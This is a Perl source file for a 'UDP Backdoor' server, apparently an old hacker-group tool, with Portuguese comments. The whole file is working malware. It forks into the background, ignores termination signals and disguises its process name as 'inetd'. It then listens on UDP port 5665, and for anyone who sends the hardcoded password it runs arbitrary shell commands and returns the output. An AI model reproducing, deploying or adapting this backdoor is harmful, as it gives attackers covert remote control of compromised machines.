   #!/usr/bin/perl
   # UDP Backdoor [Servidor]
   #     0ldW0lf - old-wolf@zipmail.com
   #             - www.atrixbr.cjb.net
   #             - www.atrix.cjb.net
   #
   #  ./udpbd [port] <- port is 5665 if not port especifyed
   #

   my $proc_name = "inetd";
   my $password = "password";

   $SIG{TERM} = 'IGNORE';
   $SIG{HUP} = 'IGNORE';
   $SIG{INT} = 'IGNORE';
   $pid=fork;
   exit if $pid;
   $0="$proc_name". "\0" x 16;
   die "Erro: $!" unless defined($pid);
   $port = $ARGV[0] || 5665;
   $AF_INET=2;$SOCK_DGRAM=2;
   $sockaddr='S n a4 x8';
   $partialaddr='S n a4';
   ($name, $aliases, $proto) = getprotobyname('udp');
   if ($port!~ /^\d+$/) {($name, $aliases, $port) = getservbyport($port, 'udp');}
   socket(SOCK, $AF_INET, $SOCK_DGRAM, $proto) || die "socket: $!";
   $this=pack($sockaddr, $AF_INET, $port, "\0\0\0\0");
   bind(SOCK,$this) || die "Could not open port $port: $!";
   select(SOCK); $|=1; select(stdout);
   while ( 1 ) {
   while ($addr = recv(SOCK, $data, 65535, MSG_WAITALL)) {
     next unless($data =~ /^(\S+):(.*)/);
     my $pass = $1;
     $data = $2;
     next if ($pass ne $password);

     sub uhd {
       chop($usr=`whoami`);
       chop($hn=`hostname`);
       chop($dir=`pwd`);
       send(SOCK, "\001$usr\@$hn\:$dir\001", 0, $addr);
     }
     if($data =~ /^cd\s+(.*)/) {
       chdir($1)||send(SOCK, "Erro: $!\n", 0, $addr);
       &uhd;
       send(SOCK, "-end.", 0, $addr);
     } else {
         if ($pid = fork) {
           waitpid($pid, 0);
         } else {
            if (fork) {
               exit;
            } else {
               if ($data =~ /\002falae maneh\002/) {
                 &uhd;
               } else {
                 $resp=`$data 2>&1`;
                 if($resp){
                   $len=length($resp);
                   if ($len > 65535) {
                     @achar= split(/|/, $resp);
                     foreach $achar (@achar) {
                       send(SOCK, "$achar", 0, $addr);
                     }
                   } else {
                      send(SOCK, "$resp", 0, $addr);
                   }
                 }
                 &uhd;
               }
               send(SOCK, "-end.", 0, $addr);
               exit;
            }
         }
     }
   }
   }
